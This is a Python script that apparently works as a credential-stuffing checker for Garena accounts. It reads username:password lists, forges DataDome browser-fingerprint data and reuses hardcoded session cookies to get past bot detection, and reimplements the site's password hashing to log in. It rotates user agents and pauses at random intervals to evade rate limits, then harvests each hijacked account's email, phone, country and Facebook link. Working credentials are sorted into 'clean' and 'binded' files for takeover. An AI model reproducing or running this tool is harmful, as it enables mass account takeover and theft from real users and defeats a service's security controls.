from Crypto.Cipher import AES
import hashlib
import requests
import time
import json
import os
import random
import logging
import urllib.parse

def print_result(account, status, details=None, warning=None):
    separator = "_" * 80
    print(separator)
    print(f" Checking : {account}")
    print(f" : {account}")
    
    if status == "error_auth":
        print(f" Failed: {status}")
    elif status == "success":
        print(f" Succes: {account}")
        print(" Processing")
        if warning:
            print(f" Warning: {account} - Status: {warning} - Saved to binds.txt")
    print(separator)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def set_starter_cookie(session):
    starter_cookie = "_ga=GA1.1.679306101.1727075595; _ga_G8QGMJPWWV=GS1.1.1729344366.1.0.1729344366.0.0.0; _ga_XB5PSHEQB4=GS1.1.1729427169.2.0.1729427169.0.0.0; _ga_G3FBKF6PP0=GS1.1.1729700876.7.0.1729700903.0.0.0; ac_session=da926d99wxpv20cgfnwm4v22znrczund; sso_key=2469ac9d278172dc7eb845f3ac7817ec5abc304343f054a5fe3f8791e7fc4eac; datadome=wQE8taYBHl_rHi6hzu8soK8Adu~wvlK3H2x3f9MglKMjyxekEhku3TvGhZCFWskU6OhJ1wTo_rs3qPHkdAeslzZ2_WAvuWETKdOXcw33fFMJP9T6m_XfI9PuNZBVNVcA; _ga_1M7M9L6VPX=GS1.1.1729700915.36.1.1729702134.0.0.0"
    
    for cookie in starter_cookie.split('; '):
        name, value = cookie.split('=', 1)
        session.cookies.set(name, value)
    
    logging.info("Starter cookie set")

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {item.split("=")[0].strip(): item.split("=")[1].strip() for item in cookie_str.split(";")}
    session.cookies.update(cookie_dict)
    logging.info(f"Applied Cookie: {cookie_dict}")

def get_random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/128.0 Safari/537.36"
    ]
    return random.choice(user_agents)

def get_session():
    session = requests.Session()
    return session

def get_datadome_cookie(session, user_agent):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user_agent
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=64)),
        'ddk': ''.join(random.choices('ABCDEF0123456789', k=32)),
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = session.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            logging.info(f"DataDome cookie found: {datadome}")
            return datadome
        else:
            logging.error(f"DataDome cookie not found in response. Status code: {response_json['status']}")
            logging.error(f"Response content: {response.text[:200]}...")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error getting DataDome cookie: {e}")
        return None

def prelogin(session, account, user_agent):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent
    }

    try:
        response = session.get(url, headers=headers, params=params)
        response.raise_for_status()
        data = response.json()
        new_datadome = response.cookies.get('datadome')

        if 'error' in data:
            logging.error(f"Prelogin error for {account}: {data['error']}")
            return None, None, new_datadome

        logging.info(f"Prelogin successful: {account}")
        return data.get('v1'), data.get('v2'), new_datadome
    except Exception as e:
        logging.error(f"Error fetching prelogin data for {account}: {e}")
        return None, None, None

def login(session, account, password, v1, v2, user_agent):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://sso.garena.com/universal/login',
        'user-agent': user_agent
    }
    try:
        response = session.get(url, headers=headers, params=params)
        response.raise_for_status()
        data = response.json()
        sso_key = response.cookies.get('sso_key')
        if 'error' in data:
            logging.error(f"Login failed: {data['error']}")
            return None
        logging.info(f"Logged in: {account}")
        return sso_key
    except requests.RequestException as e:
        logging.error(f"Login failed: {e}")
        return None

def initaccount(session, sso_key, user_agent):
    url = 'https://account.garena.com/api/account/init'
    headers = {
        'accept': '*/*',
        'cookie': f'sso_key={sso_key}',
        'referer': 'https://account.garena.com/',
        'user-agent': user_agent
    }
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()
        data = response.json()
        ac_session = response.cookies.get('ac_session')
        logging.info("Account initialized")
        return ac_session
    except requests.RequestException as e:
        logging.error(f"Initialization failed: {e}")
        return None

def parse_account_details(data):
    user_info = data.get('user_info', {})
    binds = []
    
    if user_info.get('email'):
        binds.append('Email')
    if user_info.get('mobile_no'):
        binds.append('Phone')
    facebook_linked = 'Linked' if user_info.get('fb_account') else 'Not Linked'
    facebook_uid = user_info.get('fb_account', {}).get('uid') if user_info.get('fb_account') and isinstance(user_info['fb_account'], dict) else None
    
    return {
        'username': user_info.get('username', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'mobile': user_info.get('mobile_no', 'N/A'),
        'country': user_info.get('acc_country', 'N/A'),
        'binds': binds,
        'status': 'Clean' if not binds else 'Binded',
        'facebook_linked': facebook_linked,
        'facebook_uid': facebook_uid
    }

def get_fresh_cookie(session):
    cookies = session.cookies.get_dict()
    return '; '.join([f"{name}={value}" for name, value in cookies.items()])

def refresh_cookies(session, user_agent):
    init_url = 'https://account.garena.com/api/account/init'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent
    }

    try:
        response = session.get(init_url, headers=headers)
        response.raise_for_status()
        for cookie in response.cookies:
            session.cookies.set(cookie.name, cookie.value)

        logging.info("Cookies refreshed successfully")
        return True
    except requests.RequestException as e:
        logging.error(f"Error refreshing cookies: {e}")
        return False

def processaccount(session, account, password, user_agent):
    set_starter_cookie(session)
    v1, v2, new_datadome = prelogin(session, account, user_agent)
    if not v1 or not v2:
        return f"{account}: Invalid (Prelogin failed)"

    if new_datadome:
        session.cookies.set('datadome', new_datadome)
    sso_key = login(session, account, password, v1, v2, user_agent)
    if not sso_key:
        return f"{account}: Invalid (Login failed)"

    session.cookies.set('sso_key', sso_key)

    ac_session = initaccount(session, sso_key, user_agent)
    if not ac_session:
        return f"{account}: Invalid (Initialization failed)"
    session.cookies.set('ac_session', ac_session)

    account_init_url = 'https://account.garena.com/api/account/init'
    headers = {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': user_agent
    }
    
    try:
        response = session.get(account_init_url, headers=headers)
        response.raise_for_status()
        account_data = response.json()
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                return f"{account}: Invalid (Authentication error)"
            return f"{account}: Error fetching details ({account_data['error']})"
        
        details = parse_account_details(account_data)
        
        bind_status = "Clean" if not details['binds'] else f"Binded ({', '.join(details['binds'])})"
        facebook_status = "Facebook account linked" if details['facebook_linked'] == 'Linked' else "No Facebook account linked"
        logging.info(f"{details['username']} from {details['country']} - {facebook_status}")

        return {
            'account': account,
            'password': password,
            'status': 'Success',
            'username': details['username'],
            'email': details['email'],
            'phone': details['mobile'],
            'country': details['country'],
            'bind_status': bind_status,
            'facebook_status': facebook_status,
            'is_clean': len(details['binds']) == 0
        }
    
    except requests.RequestException as e:
        logging.error(f"Error fetching account details for {account}: {e}")
        return f"{account}: Error fetching details"
        
def save_fresh_cookie(cookie):
    with open('fresh_cookies.txt', 'a') as f:
        f.write(cookie + '\n')

def get_random_cookie():
    if os.path.exists('fresh_cookies.txt'):
        with open('fresh_cookies.txt', 'r') as f:
            cookies = f.read().splitlines()
        if cookies:
            return random.choice(cookies)
    return None

def readaccount(filename):
    try:
        with open(filename, 'r') as file:
            accounts = [line.strip().split(':') for line in file]
        
        initial_cookie = get_random_cookie()
        if not initial_cookie:
            initial_cookie = "_ga=GA1.1.1225662138.1731828153; sso_key=cc3b6092ee3fae81d8fe0a75d1816abbfbba7518ec521342bc606e284addfe77; _ga_1M7M9L6VPX=GS1.1.1733937358.19.0.1733937358.0.0.0; datadome=haQZfc9NkrjkUNBhcEywrbGqVoOlN6UdhpsvVMfE_UAUp0NysQWaTIWlspikHLIneHV3X~9Jjne~FA5f_zdESm5LR7AWxBvaTl2kdOzYQtek18b0Bh0o06oKpC~bEHYr"
        
        current_cookie = initial_cookie

        for index, account_info in enumerate(accounts):
            if len(account_info) != 2:
                logging.warning(f"Skipping invalid format: {':'.join(account_info)}")
                continue

            account, password = account_info
            logging.info(f"Processing {account}...")

            session = get_session()
            applyck(session, current_cookie)
            user_agent = get_random_user_agent()
            result = processaccount(session, account, password, user_agent)

            if isinstance(result, dict):
                if result['is_clean']:
                    with open('clean.txt', 'a') as clean_file:
                        clean_file.write(f"{account}:{password}\n")
                    logging.info(f"{result['account']}: Clean - Saved to clean.txt")
                else:
                    with open('binds.txt', 'a') as binds_file:
                        binds_file.write(f"{account}:{password}:{result['bind_status']}\n")
                    logging.info(f"{result['account']}: {result['bind_status']} - Saved to binds.txt")
                
                fresh_cookie = get_fresh_cookie(session)
                if fresh_cookie:
                    logging.info(f"Fresh cookie obtained for next account: {fresh_cookie[:50]}...")
                    save_fresh_cookie(fresh_cookie)
                    current_cookie = fresh_cookie
                else:
                    logging.warning("Failed to obtain a fresh cookie. Using the previous one.")
            else:
                with open('errors.txt', 'a') as errors_file:
                    errors_file.write(f"{account}:{password}:{result}\n")
                logging.error(f"{account}: Error - {result}")

            time.sleep(random.uniform(5, 10))

    except Exception as e:
        logging.error(f"Error reading accounts: {e}")
        logging.exception("Exception details:")

if __name__ == "__main__":
    filename = input("Enter the filename containing accounts: ")
    readaccount(filename)